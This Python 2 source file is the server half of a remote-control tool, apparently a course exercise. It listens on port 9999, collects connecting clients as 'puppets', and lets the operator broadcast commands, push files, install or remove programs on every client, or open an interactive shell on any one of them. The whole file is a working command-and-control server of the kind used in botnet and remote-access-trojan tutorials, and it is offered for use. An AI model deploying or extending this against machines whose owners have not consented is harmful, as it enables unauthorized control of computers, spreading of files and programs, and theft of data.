#!/usr/bin/python

import socket
import sys
import os
from Queue import Queue
import threading
import datetime
import time

NUMBER_THREADS = 2
NUMBER_JOBS = [1, 2]
all_connections = []
all_addresses = []
queue = Queue()


# Create socket
def socket_create():
    try:
        global host
        global port
        global s
        # global f
        # f = True
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as e:
        print "Socket creating error : {}".format(str(e))

    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)


# Bind socket to port and wait for connection from client
def socket_bind():
    try:
        global host
        global port
        global s
        print "Binding socket to port {} ...".format(port)
        s.bind((host, port))
        s.listen(5)
    except socket.error as e:
        print "Socket binfing error : {} \n Retrying...".format(str(e))
        time.sleep(5)
        socket_bind()


# Accept connections from multipe clients and save to list
def accept_connections():
    for c in all_connections:
        c.close()
    del all_addresses[:]
    del all_connections[:]
    while 1:
        try:
            conn, address = s.accept()
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(address)
            print "\nConnections has been established: " + address[0]
        except:
            print "Error accepting connections"


# Interactive prompt for sending remotely
def options():
    global f

    if f:
        Segment()
        menu()
        f = False

    os.system("clear")

    while True:
        cmd = raw_input('---PRESS Enter--> ')
        os.system("clear")
        menu()
        cmd = raw_input('select option above +++> ')
        if cmd == '1':
            get_list_connections()
        elif cmd == '2':
            Send_commands_to_all_client()
        elif cmd == '3':
            Transfare_file_to_all_clients()
        elif cmd == '4':
            namr = raw_input("plz insert name of pragrame ypu want to install --->")
            install_programe(namr)
        elif cmd == '5':
            namr = raw_input("plz insert name of pragrame ypu want to remove --->")
            remove_programe(namr)
        elif cmd == '6':
            get_list_connections()
            try:
                target = int(raw_input("select number of puppt to give shell : "))
                conn = get_target(target)
                if conn is not None:
                    send_target_commands(conn, target)
            except Exception as e:
                print "You dont select the right puppet from the above table...."

        elif cmd == '7':
            print 'Master Puppet shutdown'
            exits()
            s.close()
            sys.exit()
            #break

        else:
            print "Command not recognized"

    options()


# Close chat with clients
def exits():
    if len(all_connections) == 0:
        queue.task_done()
        queue.task_done()
    else:
        for conn in all_connections:
            conn.send(str.encode('quit'))
            conn.recv(1024)
            queue.task_done()



# Display all current connections
def get_list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode('sh'))
            conn.recv(2048)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        results += str(i) + ' ' + str(all_addresses[i][0]) + ' ' + str(all_addresses[i][1]) + '\n'
    print '---puppets table---\n' + results


# Send commands to all client
def Send_commands_to_all_client():
    while True:
        cmd = raw_input("insert any commands to all clients-->")
        cmd = 'se' + cmd
        if len(cmd) > 2:
            for conn in (all_connections):
                conn.send(str.encode(cmd))
            if cmd[2:] == 'quit':
                print "you choose to Exit "
                break

    if len(all_connections) == 0:
        print "You dont have connection with any client"


# Transfer files to clients
def Transfare_file_to_all_clients():
    while True:
        try:
            c = 0
            sourcefile = raw_input("Source File -->")
            destination = raw_input("Destination path -->")

            for i, conn in enumerate(all_connections):
                f = open(sourcefile, 'rb')
                data_file = f.read(1024)
                conn.send(str.encode('tr') + str.encode(destination))
                res = str.decode(conn.recv(32))
                print str(res) + '  from : ' + str(all_addresses[i][0]) + ' ' + str(all_addresses[i][1]) + '\n'
                if res == 'ok':
                    while (data_file):
                        conn.send(data_file)
                        data_file = f.read(2048)

                conn.send(str.encode('done'))
                mes = str.decode(conn.recv(64))
                if mes == "done":
                    print "transfare file is sucsses to {}".format(str(all_addresses[i][0]))
                    f.close()
                    c = i


            if c == i :
                time.sleep(1)
                key = raw_input("Do you want to transfare another file? y/n ")
                if key.lower() == 'n':
                    break
                else:
                    continue

        except Exception as e:
            print "you dont have a right path".format(str(e))
            key = raw_input("Do you want to transfare another file? y/n ")
            if key.lower() == 'n':
                break
            else:
                continue

        if len(all_connections) == 0:
            print "You dont have connection with any client"
            break


# Select a target
def get_target(target):
    try:
        conn = all_connections[target]
        print "Your now connect to   " + str(all_addresses[target][0])
        return conn
    except:
        print "NOt a valid selection"
        return None


# Connect with remote target client
def send_target_commands(conn, target):
    global name
    conn.send(str.encode('Shell'))
    name_dir= str(conn.recv(2048))
    name_dir = name_dir[1:]
    last = name_dir

    while True:

        try:
            cmd = raw_input("{}@{} >:".format(str(all_addresses[target][0]),name_dir))
            if cmd.decode("utf-8") == 'quit':
                conn.send(str.encode('quit'))
                break
            elif cmd[:2].decode("utf-8") == 'cd':
                conn.send(str.encode(cmd))
                name_dir = str.decode(conn.recv(1024))
                conn.send('')
                name_dir = name_dir[1:]

            else:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480))
                print client_response

        except Exception as e:
            print "Connection was lost : %s" % str(e)


# installation something to clients
def install_programe(name):
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode('in'))
            if str.decode(conn.recv(1024)) == 'ok':
                conn.send(str.encode(name))
                if str.decode(conn.recv(1024)) == 'done':
                    print "installation successful : {}".format(str(all_addresses[i][0]))
                else:
                    print "installation fauilre : {}".format(str(all_addresses[i][0]))
            else:
                print 'sorry.. i lost my connection '
        except socket.error as e:
            print "We have trouble:: {}".format(str(e))


# Remove something to clients
def remove_programe(name):

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode('re'))
            if str.decode(conn.recv(1024)) == 'ok':
                conn.send(str.encode(name))
                if str.decode(conn.recv(1024)) == 'done':
                    print "remove successful : {}".format(str(all_addresses[i][0]))
                else:
                    print "installation fauilre : {}".format(str(all_addresses[i][0]))
            else:
                print 'sorry.. i lost my connection with {} '
        except socket.error as e:
            print "We have trouble:: {}".format(str(e))


# Create work:er threads
def create_workers():
    for _ in range(NUMBER_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


# Do next job in the queue
def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accept_connections()
        if x == 2:
            options()
        queue.task_done()


# Each list is a new job
def create_jobs():
    for x in NUMBER_JOBS:
        queue.put(x)
    queue.join()


# Display menu
def menu():
    print ('\n'
           'Menu\n'
           '1.Show all clients\n'
           '2.Send commands to all client\n'
           '3.Transfer file to clients all clients\n'
           '4.Install something on all clients\n'
           '5.Remove something from all clients\n'
           '6.Remote control of specific client\n'
           '7.exit')


# get my Ip
def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 80))
    segment = s.getsockname()[0]
    s.close()
    return segment


# GET MY SEGMENT
def Segment():
    hostname = socket.gethostname()
    ip = get_ip_address()
    dns = socket.gethostbyname('google.com')  # os sends out a dns query
    gww = os.popen("ip route show | grep 'default' | awk '{print $3}' ")
    gw = gww.read()
    current_time = datetime.datetime.now().time()

    print ("\n"
           "################################################\n"
           "## PYTHON 102   NAME=GZ.ABED   TIME={}  ##\n"
           "################################################\n"
           " * My IP : {}\n"
           " * MY HOSTNAME : {}\n"
           " * MY DNS : {}\n"
           " * MY GW : {}"
           "###############################################\n"
           "    ").format(unicode(current_time.replace(microsecond=0)), ip, hostname, dns, gw)


def main():
    global f
    f = True
    os.system("clear")
    create_workers()
    create_jobs()


if __name__ == '__main__':
    main()